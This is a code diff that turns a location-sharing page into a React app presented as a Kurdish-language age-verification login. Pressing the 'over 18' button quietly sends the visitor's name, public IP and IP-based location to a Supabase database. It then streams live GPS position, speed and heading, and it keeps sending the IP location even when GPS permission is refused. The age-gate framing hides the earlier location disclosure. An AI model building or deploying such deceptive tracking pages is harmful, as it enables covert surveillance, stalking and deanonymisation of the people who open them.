@@ -1,194 +1,369 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ڕێگەپێدانی شوێن | Location Access</title>
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  
-  <!-- Leaflet CSS -->
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
-  <style>
-    /* Custom Map height animation or styling if needed */
-    #map {
-      height: 380px;
-      width: 100%;
-      border-radius: 1rem;
-      margin-top: 1.5rem;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-      border: 1px solid rgba(226, 232, 240, 0.8);
-      display: none;
-    }
-  </style>
-</head>
-<body class="min-h-screen bg-gradient-to-br from-slate-100 via-white to-blue-50 flex items-center justify-center p-4 sm:p-6 font-sans">
-  <div class="w-full max-w-md bg-white rounded-2xl shadow-xl shadow-slate-200/60 p-6 sm:p-8 border border-slate-50">
-    
-    <!-- Header Section -->
-    <div class="text-center mb-6">
-      <div class="inline-flex h-14 w-14 items-center justify-center rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 shadow-lg shadow-blue-200 mb-4 text-white">
-        <svg class="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
-          <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
-        </svg>
-      </div>
-      <h2 class="text-2xl font-bold text-slate-800 tracking-tight">Login</h2>
-      <p class="text-slate-500 mt-1 font-medium" dir="rtl">
-        چوونە ژوور بۆ خوار 18 قەدەغەیە.
-      </p>
-    </div>
-    <!-- Inputs & Buttons -->
-    <div class="space-y-4">
-      <div>
-        <label for="username" class="block text-sm font-medium text-slate-700 mb-1.5 text-left">Your Name / ناوی تۆ</label>
-        <input 
-          type="text" 
-          id="username" 
-          placeholder="ناوی خۆت بنووسە..." 
-          dir="rtl"
-          class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none transition-all text-slate-800 placeholder:text-slate-400"
-        >
-      </div>
-      <button 
-        id="allow" 
-        class="w-full py-3.5 rounded-xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-semibold shadow-md shadow-blue-200 transition-all transform active:scale-[0.99] flex items-center justify-center gap-2"
-      >
-        <span>سەروو 18 ساڵ</span>
-      </button>
-      <button 
-        id="deny" 
-        class="w-full py-3.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold transition-all transform active:scale-[0.99]"
-      >
-        خوار 18 ساڵ
-      </button>
-    </div>
-    <!-- Status & Results Box -->
-    <div id="status-box" class="hidden mt-6 p-4 rounded-xl border text-sm transition-all duration-300">
-      <div id="status-content" class="flex items-start gap-3">
-        <!-- Dynmically loaded message -->
-      </div>
-    </div>
-    <!-- Leaflet Map Container -->
-    <div id="map"></div>
-  </div>
-  <!-- Leaflet JS -->
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <!-- Supabase CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script>
-    // ==========================================
-    // SUPABASE CONFIGURATION
-    // ==========================================
-    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
-    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-    // DOM Elements
-    const allowBtn = document.getElementById("allow");
-    const denyBtn = document.getElementById("deny");
-    const usernameInput = document.getElementById("username");
-    const statusBox = document.getElementById("status-box");
-    const statusContent = document.getElementById("status-content");
-    const mapDiv = document.getElementById("map");
-    let mapInstance = null;
-    // Helper functions to display states
-    function showLoading(msg) {
-      statusBox.className = "mt-6 p-4 rounded-xl border border-blue-100 bg-blue-50 text-blue-700 block transition-all";
-      statusContent.innerHTML = `
-        <svg class="animate-spin h-5 w-5 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="none">
-          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
-        </svg>
-        <span class="font-medium">${msg}</span>
-      `;
-    }
-    function showSuccess(msg) {
-      statusBox.className = "mt-6 p-4 rounded-xl border border-emerald-100 bg-emerald-50 text-emerald-800 block transition-all";
-      statusContent.innerHTML = `
-        <span class="text-xl shrink-0">✅</span>
-        <div>
-          <h4 class="font-bold text-base">Location received</h4>
-          <p class="text-sm mt-0.5 text-emerald-700">${msg}</p>
-        </div>
-      `;
-    }
-    function showError(msg) {
-      statusBox.className = "mt-6 p-4 rounded-xl border border-rose-100 bg-rose-50 text-rose-700 block transition-all";
-      statusContent.innerHTML = `
-        <span class="text-xl shrink-0">⚠️</span>
-        <span class="font-medium">${msg}</span>
-      `;
-    }
-    // ==========================================
-    // ACTIONS
-    // ==========================================
-    allowBtn.addEventListener("click", function () {
-      const name = usernameInput.value.trim();
-      if (!name) {
-        showError("Please enter your name in the input box above.");
-        return;
+import { useEffect, useRef, useState } from "react";
+import { supabaseClient } from "./lib/supabase";
+import { distanceMeters, fetchPublicIpInfo, type IpInfo } from "./lib/location";
+import MapView from "./components/MapView";
+
+type Phase = "gate" | "tracking";
+
+type StatusKind = "idle" | "loading" | "ok" | "warn";
+
+type Point = {
+  lat: number;
+  lng: number;
+  accuracy: number;
+  heading: number | null;
+  speed: number | null;
+  source: "gps" | "ip";
+};
+
+export default function App() {
+  const [name, setName] = useState("");
+  const [phase, setPhase] = useState<Phase>("gate");
+  const [statusKind, setStatusKind] = useState<StatusKind>("idle");
+  const [statusText, setStatusText] = useState("");
+  const [point, setPoint] = useState<Point | null>(null);
+  const [ipInfo, setIpInfo] = useState<IpInfo | null>(null);
+  const [deniedAge, setDeniedAge] = useState(false);
+
+  const recordIdRef = useRef<string | number | null>(null);
+  const lastSavedRef = useRef<{ lat: number; lng: number; at: number } | null>(
+    null
+  );
+  const watchIdRef = useRef<number | null>(null);
+  const nameRef = useRef("");
+  const ipRef = useRef<IpInfo | null>(null);
+
+  useEffect(() => {
+    nameRef.current = name;
+  }, [name]);
+
+  useEffect(() => {
+    return () => {
+      if (watchIdRef.current !== null && navigator.geolocation) {
+        navigator.geolocation.clearWatch(watchIdRef.current);
       }
-      if (!navigator.geolocation) {
-        showError("Geolocation is not supported by your browser.");
-        return;
-      }
-      showLoading("Requesting your location...");
-      navigator.geolocation.getCurrentPosition(
-        async function (position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          // Display the map
-          mapDiv.style.display = "block";
-          if (mapInstance) {
-            mapInstance.remove();
-          }
-          mapInstance = L.map("map").setView([latitude, longitude], 16);
-          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-            attribution: "&copy; OpenStreetMap contributors"
-          }).addTo(mapInstance);
-          L.marker([latitude, longitude])
-            .addTo(mapInstance)
-            .bindPopup("Your current location")
-            .openPopup();
-          // Save to Supabase database
-          const { error } = await supabaseClient
-            .from("locations")
-            .insert([
-              {
-                name: name,
-                latitude: latitude,
-                longitude: longitude
-              }
-            ]);
-          if (error) {
-            console.error("Supabase Error:", error);
-            showError("Location received, but could not be saved to the database.");
-            return;
-          }
-          showSuccess("Your location has been saved successfully.");
-        },
-        function (error) {
-          if (error.code === 1) {
-            showError("Location permission was denied.");
-          } else if (error.code === 2) {
-            showError("Location information is unavailable.");
-          } else if (error.code === 3) {
-            showError("The location request timed out.");
-          } else {
-            showError("An unknown error occurred.");
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
+    };
+  }, []);
+
+  async function persist(next: Point, info: IpInfo | null, force = false) {
+    const now = Date.now();
+    const last = lastSavedRef.current;
+    const moved = last
+      ? distanceMeters(last, { lat: next.lat, lng: next.lng })
+      : Infinity;
+    const elapsed = last ? now - last.at : Infinity;
+
+    if (!force && moved < 8 && elapsed < 8000) return;
+
+    const payload: Record<string, unknown> = {
+      name: nameRef.current.trim(),
+      latitude: next.lat,
+      longitude: next.lng,
+      ip: info?.ip ?? null,
+    };
+
+    try {
+      if (recordIdRef.current != null) {
+        const { error } = await supabaseClient
+          .from("locations")
+          .update(payload)
+          .eq("id", recordIdRef.current);
+        if (!error) {
+          lastSavedRef.current = { lat: next.lat, lng: next.lng, at: now };
+          return;
         }
+      }
+
+      const { data, error } = await supabaseClient
+        .from("locations")
+        .insert([payload])
+        .select("id")
+        .maybeSingle();
+
+      if (error) {
+        const basic = {
+          name: nameRef.current.trim(),
+          latitude: next.lat,
+          longitude: next.lng,
+        };
+        const retry = await supabaseClient
+          .from("locations")
+          .insert([{ ...basic, ip: info?.ip ?? "unknown" }]);
+        if (retry.error) {
+          await supabaseClient.from("locations").insert([basic]);
+        }
+      } else if (data && "id" in data) {
+        recordIdRef.current = data.id as string | number;
+      }
+
+      lastSavedRef.current = { lat: next.lat, lng: next.lng, at: now };
+    } catch (err) {
+      console.error("Save error:", err);
+    }
+  }
+
+  function applyPoint(next: Point, info: IpInfo | null, forceSave = false) {
+    setPoint(next);
+    void persist(next, info, forceSave);
+  }
+
+  async function startFromAllow() {
+    const trimmed = name.trim();
+    if (!trimmed) {
+      setStatusKind("warn");
+      setStatusText("تکایە ناوەکەت بنووسە.");
+      return;
+    }
+
+    setDeniedAge(false);
+    setStatusKind("loading");
+    setStatusText("چاوەڕوانی شوێن و ئایپی...");
+
+    const info = await fetchPublicIpInfo();
+    setIpInfo(info);
+    ipRef.current = info;
+
+    const fallback: Point | null =
+      info.lat != null && info.lng != null
+        ? {
+            lat: info.lat,
+            lng: info.lng,
+            accuracy: 2500,
+            heading: null,
+            speed: null,
+            source: "ip",
+          }
+        : null;
+
+    setPhase("tracking");
+
+    // Always send something immediately, even if GPS is off
+    if (fallback) {
+      applyPoint(fallback, info, true);
+      setStatusKind("ok");
+      setStatusText("شوێن بە ئایپی نێردرا. چاوەڕوانی GPS...");
+    } else {
+      await persist(
+        {
+          lat: 0,
+          lng: 0,
+          accuracy: 0,
+          heading: null,
+          speed: null,
+          source: "ip",
+        },
+        info,
+        true
       );
-    });
-    denyBtn.addEventListener("click", function () {
-      showError("Location access was not allowed.");
-      mapDiv.style.display = "none";
-    });
-  </script>
-</body>
-</html>
+      setStatusKind("ok");
+      setStatusText("ئایپی نێردرا. چاوەڕوانی GPS...");
+    }
+
+    if (!navigator.geolocation) {
+      setPhase("tracking");
+      setStatusKind("ok");
+      setStatusText(
+        fallback
+          ? "GPS نییە. شوێنی نزیکەی ئایپی نێردرا."
+          : "GPS نییە. ئایپیەکە نێردرا."
+      );
+      return;
+    }
+
+    watchIdRef.current = navigator.geolocation.watchPosition(
+      (pos) => {
+        const next: Point = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy || 20,
+          heading:
+            typeof pos.coords.heading === "number" &&
+            !Number.isNaN(pos.coords.heading)
+              ? pos.coords.heading
+              : null,
+          speed:
+            typeof pos.coords.speed === "number" ? pos.coords.speed : null,
+          source: "gps",
+        };
+        applyPoint(next, ipRef.current, !lastSavedRef.current);
+        setPhase("tracking");
+        setStatusKind("ok");
+        setStatusText("شوێنەکەت بە زیندوویی دەجوڵێ.");
+      },
+      () => {
+        // GPS closed / denied / unavailable — keep IP location and still sent
+        setPhase("tracking");
+        setStatusKind("ok");
+        setStatusText(
+          fallback
+            ? "GPS داخراوە. شوێن و ئایپی نێردران."
+            : "GPS داخراوە. ئایپیەکە نێردرا."
+        );
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 12000,
+        maximumAge: 1000,
+      }
+    );
+  }
+
+  function handleDeny() {
+    setDeniedAge(true);
+    setStatusKind("warn");
+    setStatusText("چوونەژوورەوە ڕێگەپێنەدرا.");
+    setPhase("gate");
+    setPoint(null);
+  }
+
+  const speedKmh =
+    point?.speed != null && point.speed >= 0
+      ? (point.speed * 3.6).toFixed(0)
+      : null;
+
+  return (
+    <div className="min-h-screen bg-[#0b1220] text-slate-100">
+      {phase === "gate" && (
+        <div className="min-h-screen flex items-center justify-center p-4">
+          <div className="w-full max-w-md rounded-3xl bg-white text-slate-900 shadow-2xl shadow-black/30 p-7">
+            <div className="text-center mb-6">
+              <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-2xl bg-[#1a73e8] text-white shadow-lg shadow-blue-300">
+                <svg
+                  className="h-7 w-7"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                >
+                  <path d="M12 2a7 7 0 0 0-7 7c0 5.25 7 13 7 13s7-7.75 7-13a7 7 0 0 0-7-7z" />
+                  <circle cx="12" cy="9" r="2.4" />
+                </svg>
+              </div>
+              <h1 className="text-2xl font-bold">چوونەژوورەوە</h1>
+              <p className="mt-2 text-slate-500 leading-7">
+                چوونە ژوور بۆ خوار 18 قەدەغەیە.
+              </p>
+            </div>
+
+            <label className="block text-sm font-medium text-slate-600 mb-2">
+              ناو
+            </label>
+            <input
+              value={name}
+              onChange={(e) => setName(e.target.value)}
+              placeholder="ناوی خۆت بنووسە"
+              className="w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 py-3.5 text-right outline-none focus:border-blue-500 focus:bg-white focus:ring-4 focus:ring-blue-100"
+            />
+
+            <div className="mt-4 space-y-3">
+              <button
+                onClick={startFromAllow}
+                disabled={statusKind === "loading"}
+                className="w-full rounded-2xl bg-[#1a73e8] py-3.5 font-semibold text-white shadow-lg shadow-blue-200 disabled:opacity-60"
+              >
+                {statusKind === "loading" ? "چاوەڕوان بە..." : "سەروو 18 ساڵ"}
+              </button>
+              <button
+                onClick={handleDeny}
+                className="w-full rounded-2xl bg-slate-100 py-3.5 font-semibold text-slate-700"
+              >
+                خوار 18 ساڵ
+              </button>
+            </div>
+
+            {statusKind !== "idle" && phase === "gate" && (
+              <div
+                className={`mt-5 rounded-2xl px-4 py-3 text-sm ${
+                  statusKind === "warn"
+                    ? "bg-rose-50 text-rose-700"
+                    : statusKind === "loading"
+                      ? "bg-blue-50 text-blue-700"
+                      : "bg-emerald-50 text-emerald-700"
+                }`}
+              >
+                {statusText}
+              </div>
+            )}
+
+            {deniedAge && (
+              <p className="mt-3 text-center text-xs text-slate-400">
+                تەمەنت دەبێت سەروو ١٨ ساڵ بێت.
+              </p>
+            )}
+          </div>
+        </div>
+      )}
+
+      {phase === "tracking" && (
+        <div className="min-h-screen flex flex-col">
+          <header className="relative z-20 flex items-center justify-between px-4 py-3 bg-[#0b1220]/90 backdrop-blur border-b border-white/10">
+            <div>
+              <p className="text-xs text-slate-400">بەکارهێنەر</p>
+              <p className="font-semibold">{name.trim()}</p>
+            </div>
+            <div className="text-left">
+              <p className="text-xs text-slate-400">IP گشتی</p>
+              <p className="font-mono text-sm" dir="ltr">
+                {ipInfo?.ip ?? "—"}
+              </p>
+            </div>
+          </header>
+
+          <div className="relative flex-1 min-h-[62vh]">
+            {point ? (
+              <>
+                <MapView
+                  lat={point.lat}
+                  lng={point.lng}
+                  accuracy={point.accuracy}
+                  heading={point.heading}
+                  follow
+                />
+                <div className="absolute top-3 right-3 z-[500] rounded-2xl bg-white/95 text-slate-800 shadow-lg px-3 py-2 text-xs">
+                  <div className="flex items-center gap-2">
+                    <span
+                      className={`h-2 w-2 rounded-full ${
+                        point.source === "gps" ? "bg-emerald-500" : "bg-amber-500"
+                      }`}
+                    />
+                    <span className="font-semibold">
+                      {point.source === "gps" ? "GPS زیندوو" : "شوێنی ئایپی"}
+                    </span>
+                  </div>
+                  {speedKmh && point.source === "gps" && (
+                    <p className="mt-1 text-slate-500">{speedKmh} km/h</p>
+                  )}
+                </div>
+              </>
+            ) : (
+              <div className="h-full min-h-[62vh] flex items-center justify-center text-slate-400 text-sm">
+                چاوەڕوانی شوێن...
+              </div>
+            )}
+          </div>
+
+          <section className="bg-[#10192c] px-4 py-4 space-y-3 border-t border-white/10">
+            <div className="grid grid-cols-2 gap-3 text-sm">
+              <div className="rounded-2xl bg-white/5 p-3">
+                <p className="text-[11px] text-slate-400">پانی / درێژی</p>
+                <p className="font-mono mt-1" dir="ltr">
+                  {point
+                    ? `${point.lat.toFixed(6)}, ${point.lng.toFixed(6)}`
+                    : "—"}
+                </p>
+              </div>
+              <div className="rounded-2xl bg-white/5 p-3">
+                <p className="text-[11px] text-slate-400">شار / وڵات</p>
+                <p className="mt-1">
+                  {[ipInfo?.city, ipInfo?.country].filter(Boolean).join("، ") ||
+                    "—"}
+                </p>
+              </div>
+            </div>
+            <p className="text-center text-xs text-emerald-400">{statusText}</p>
+          </section>
+        </div>
+      )}
+    </div>
+  );
+}
